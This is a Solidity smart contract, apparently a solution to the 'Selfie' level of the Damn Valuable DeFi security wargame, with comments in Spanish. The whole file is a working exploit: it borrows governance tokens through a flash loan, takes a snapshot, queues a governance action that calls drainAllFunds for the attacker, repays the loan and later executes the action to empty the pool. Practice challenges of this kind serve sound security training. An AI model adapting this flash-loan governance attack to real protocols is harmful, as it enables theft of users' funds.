// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
interface IGovernance { 
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}
interface IPool{
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}
contract ExploitV2 {
    DamnValuableTokenSnapshot private dvt;
    IGovernance private gov;
    IPool private pool;
    address  owner;


    event ActionMade(uint256 id);
    constructor(address _dvt,address _gov ,address _pool,address _owner){
        dvt = DamnValuableTokenSnapshot(_dvt);
        gov = IGovernance(_gov);
        pool = IPool(_pool);
        owner = _owner; 
    }

    
    function attack(uint256 amount) public {
       pool.flashLoan(amount);
    }


    function receiveTokens(address _token, uint256 amount) external {
        // Tomamos un snapshot 
        dvt.snapshot();
        
        // creamos nuestro byte malicioso que toma los 4 primeros bytes de la funcion drainAllFunds
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        
        // Creamos un queueAction en la DAO con nuestro exploit
        uint256 actionId = gov.queueAction(address(pool), data, 0);

        // Devolvemos el prestamo a la SelfiePool
        dvt.transfer(address(pool), amount);

        // para saber cual es la id de nuestro action para ejecutarlo dos dias despues
        emit ActionMade(actionId);
    } 

    function drain(uint256 id) external {
        // Drenamos los fondos
        gov.executeAction(id);
    }

    receive() external payable{}       
}